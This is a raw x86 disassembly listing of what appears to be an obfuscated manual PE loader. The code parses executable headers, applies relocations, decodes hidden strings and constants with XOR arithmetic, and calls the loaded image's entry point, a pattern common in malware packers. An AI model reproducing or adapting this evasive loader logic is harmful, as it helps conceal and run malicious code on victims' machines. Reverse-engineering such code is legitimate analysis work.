  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
